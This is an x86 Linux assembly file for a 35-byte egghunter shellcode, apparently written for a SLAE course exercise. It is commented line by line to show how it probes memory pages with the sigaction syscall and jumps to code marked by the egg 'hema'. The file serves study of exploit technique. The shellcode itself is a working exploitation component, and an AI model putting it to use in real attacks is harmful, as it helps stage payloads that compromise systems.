;Architecture    : x86
;OS              : Linux
;Author          : Elham AlShehri
;ID              : SLAE-1538
;Shellcode Size  : 35 bytes
;Description     : An example of egghunter shellcode of egg string hema = 0x48454d41

global _start

section .text

_start:

	xor ecx, ecx            ; make ecx = 0
pages:
	or   cx,0xfff           ; these two steps to go to the next page
	inc  ecx                ; ecx will be 0x1000, then 0x2000, then 0x3000, ...

	push byte 0x43          ; 0x43 = 67 in decimal = sigaction system call number
	pop  eax                ; pop value 0x43 in eax

	int  0x80               ; interrupt
	cmp  al,0xf2            ; check if return value = EFAULT = 0xfffffff2 = which is not valid page
	jz   short pages        ; then go to the next page
	jmp  short addr         ; otherwise, we found a valid page
next_addr:
	inc  ecx
addr:
	mov  eax,  0x48454d41   ; save Egg string in eax
	mov  edi, ecx           ; save the address in edi

	scasd                   ; compare the content inside edi and the value of eax
	jnz  short next_addr    ; 1st compare: if they are not equal go to the next address
	scasd                   ; compare the content inside edi + 4 and the value of eax
	jnz  short next_addr    ; 2nd compare: if they are not equal go to the next address
	jmp  edi                ; We found the Egg, jump to its address
